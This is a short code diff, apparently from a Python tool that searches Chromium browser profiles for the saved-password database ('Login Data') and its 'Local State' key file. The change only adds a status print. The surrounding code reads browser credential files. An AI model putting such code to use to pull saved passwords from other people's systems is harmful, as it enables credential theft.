@@ -356,6 +356,7 @@ if yes == "yes":
 						if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
 							print("Not existing")
 							continue
+			print("Existing")
 			local_state_path = chromiumpaths[i]  + "\\Local State"
 			if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
 				local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
